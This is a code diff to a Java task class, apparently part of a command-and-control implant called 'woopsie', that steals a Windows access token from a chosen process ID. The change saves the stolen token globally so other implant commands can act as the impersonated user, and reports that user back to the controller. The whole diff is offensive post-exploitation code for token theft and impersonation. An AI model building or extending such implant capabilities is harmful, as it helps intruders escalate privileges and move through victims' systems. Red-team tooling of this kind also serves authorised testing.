@@ -40,21 +40,24 @@ public class StealTokenTask implements Task {
         }
         
         Config.debugLog(config, "Attempting to steal token from PID: " + pid);
+        Config.debugLog(config, "Current user BEFORE steal_token: " + WindowsAPI.getImpersonatedUsername());
         
-        // Steal the token
-        String result = WindowsAPI.stealToken(pid);
+        // Steal the token and get the handle
+        com.woopsie.utils.WindowsAPI.TokenResult tokenResult = WindowsAPI.stealTokenWithHandle(pid);
         
         Config.debugLog(config, "Token stolen successfully");
         
-        // Get current user context after impersonation
-        String username = com.woopsie.utils.SystemInfo.getUsername();
-        String domain = com.woopsie.utils.SystemInfo.getDomain();
-        String impersonationContext = domain + "\\" + username;
+        // Save the token handle globally so other commands can use it
+        com.woopsie.Agent.setImpersonationToken(tokenResult.token);
+        
+        // Get current user context after impersonation (use thread token check)
+        String impersonationContext = WindowsAPI.getImpersonatedUsername();
+        Config.debugLog(config, "Current user AFTER steal_token: " + impersonationContext);
         
         // Return JSON with callback field containing impersonation_context (matches oopsie format)
         return String.format(
             "{\"user_output\": \"%s\", \"callback\": {\"impersonation_context\": \"%s\"}}",
-            result.replace("\\", "\\\\").replace("\"", "\\\""),
+            tokenResult.message.replace("\\", "\\\\").replace("\"", "\\\""),
             impersonationContext.replace("\\", "\\\\").replace("\"", "\\\"")
         );
     }
